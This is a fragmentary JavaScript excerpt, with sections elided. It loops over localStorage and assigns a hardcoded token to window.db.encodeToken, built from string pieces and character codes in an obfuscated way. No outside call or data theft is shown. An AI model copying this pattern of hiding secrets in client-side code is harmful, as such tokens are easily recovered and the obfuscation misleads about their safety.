 ...
 * @LastEditTime    : 2022-04-16 18:41:14
...
for (var i in localStorage){
	...
	EL(function(){
		window.db.encodeToken = "prqfV=" + String.fromCharCode(128) + "8{t~s5" + String.fromCharCode(92) + String.fromCharCode(132) + ":M>bk@MeqRb" + String.fromCharCode(131) + "~Fpv?]T1>n" + String.fromCharCode(92) + "U~";
